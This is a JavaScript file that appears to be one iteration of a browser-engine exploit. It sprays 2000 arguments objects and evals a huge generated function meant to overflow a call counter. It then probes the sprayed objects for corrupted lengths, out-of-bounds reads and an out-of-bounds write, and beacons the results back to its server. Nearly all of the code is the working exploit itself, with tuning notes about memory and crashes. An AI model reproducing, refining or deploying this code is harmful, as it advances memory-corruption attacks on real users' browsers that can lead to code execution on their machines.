// V406 LEAN - DirectArgs sweep. 2000 args. NO pre-map. eval() not Blob URL.
// Blob URL doubled memory (Blob copy + parser buffer). eval() reads string directly.
// p142 compiled 38.3M calls OK. V404/V406-blob crashed 3x at BLOB->eval stage.

(function() {
  'use strict';
  var qc = 0;
  function B(m) {
    new Image().src = '/beacon/V406-' + encodeURIComponent(m) + '?t=' + Date.now() + '&q=' + (qc++);
  }

  B('START');

  // Phase 1: Spray 2000 DirectArguments (size class 112, 14 blocks)
  var argStore = [];
  function makeArgs(a, b, c, d, e, f, g) { return arguments; }
  for (var i = 0; i < 2000; i++) {
    argStore.push(makeArgs(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47));
  }
  B('SPRAY-' + argStore.length);

  // Phase 2: Build IIFE string (38,348,816 calls = overflow to 100,096)
  B('BUILD');
  var piece = '';
  for (var i = 0; i < 1000; i++) piece += 'a();';
  var needed = Math.ceil(38348816 / 1000);
  var parts = new Array(needed);
  for (var i = 0; i < needed; i++) parts[i] = piece;
  piece = null;
  var calls = parts.join('');
  parts = null;
  B('STR-' + Math.round(calls.length / 1048576) + 'MB');

  var code = '(function(a){if(window.____xV406){' + calls + '}})(function(){})';
  calls = null;

  // GC pressure to free string intermediates before parse
  for (var g = 0; g < 3; g++) {
    try { var tmp = new ArrayBuffer(50 * 1048576); tmp = null; } catch(e) {}
  }

  try {
    B('EVAL-' + Math.round(code.length / 1048576) + 'MB');
    eval(code);
    code = null;
    B('COMPILED-OK');
    checkCorruption();
  } catch(e) {
    code = null;
    B('EVAL-ERR-' + (e.message || '').substring(0, 80));
    checkCorruption();
  }

  function checkCorruption() {
    B('CHECK');
    var corrupted = 0, oobReads = 0, valCorrupted = 0;

    for (var i = 0; i < argStore.length; i++) {
      var args = argStore[i];
      if (args.length !== 7) {
        corrupted++;
        if (corrupted <= 30) B('C-' + i + '-L' + args.length);
        if (args.length > 7 && args.length < 1000000) {
          oobReads++;
          if (oobReads <= 10) {
            var vals = [];
            for (var j = 7; j < Math.min(args.length, 20); j++) {
              try {
                var v = args[j];
                if (typeof v === 'number') vals.push(j + 'n' + (v >>> 0).toString(16));
                else if (typeof v === 'object' && v !== null) vals.push(j + 'o');
                else if (v === undefined) vals.push(j + 'u');
                else vals.push(j + typeof v[0]);
              } catch(e) { vals.push(j + 'E'); }
            }
            B('OOB-' + i + '-' + vals.join('|'));
          }
          if (oobReads === 1 && args.length > 20) {
            try {
              args[10] = 0xDEAD;
              if (args[10] === 0xDEAD) B('WRITE-OK-' + i);
            } catch(e) { B('WRITE-ERR-' + i); }
          }
        }
        if (args.length === 0 && corrupted <= 5) B('ZEROED-' + i);
      } else if (args[0] !== 0x41 || args[6] !== 0x47) {
        valCorrupted++;
        if (valCorrupted <= 10) B('VC-' + i + '-' + args[0] + '|' + args[6]);
      }
    }
    B('RESULT-C' + corrupted + '-O' + oobReads + '-V' + valCorrupted + '-T' + argStore.length);
    B('DONE');
  }
})();
